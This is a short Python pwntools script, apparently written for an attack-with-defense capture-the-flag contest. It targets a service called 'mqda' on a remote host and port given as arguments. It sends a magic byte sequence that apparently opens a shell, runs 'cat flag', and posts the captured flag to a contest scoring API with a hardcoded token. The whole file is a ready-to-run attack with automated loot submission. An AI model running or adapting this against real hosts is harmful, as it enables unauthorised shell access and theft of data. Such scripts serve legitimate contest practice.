from pwn import *
import sys
import requests

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./mqda")
else:
    p = remote(sys.argv[1], sys.argv[2])

context.log_level = "debug"
context.terminal = ["kitty"]
context.timeout = 5

def submit(flag):
    #print("here")
    url = "https://challenge.xctf.org.cn/api/ct/web/awd_race/race/62f67b900fb70517deb0fb29bebf134a/flag/robot/"
    token = "3a50326143702b844749dce40134c842"
    headers = {"Content-Type": "application/json"}
    #print(flag)
    data = {"flag" : flag.decode(), "token": token}
    print(data)
    try:
        print("submit flag: " + flag.decode())
        response = requests.post(url, headers=headers, json=data)
        #print(response.text, type(response.text))
        if "AD-000000" in response.text:
            log.success("successfully submit flag: " + flag.decode())
        #print(response)
    except:
        print("error when submit flag", flag)

def debugf(b):
    if debug:
        gdb.attach(p, "b *$rebase({b})".format(b=hex(b)))

def exp1():
    try:
        debugf(0x00000000000010B0)
        p.recvuntil(b"> ")
        p.send(b"\x21\x23\x89\x33")
        if debug:
            p.interactive()
        else:
            p.sendline(b"echo hacked_by_xxx&&cat flag")
            p.recvuntil(b"hacked_by_xxx\n")
            flag = p.recvuntil(b"\n", drop=True)
            submit(flag)
            #p.sendline("cat flag")
    except:
        try:
            p.close()
        except:
            pass
        return None

if __name__ == "__main__":
    exp1()
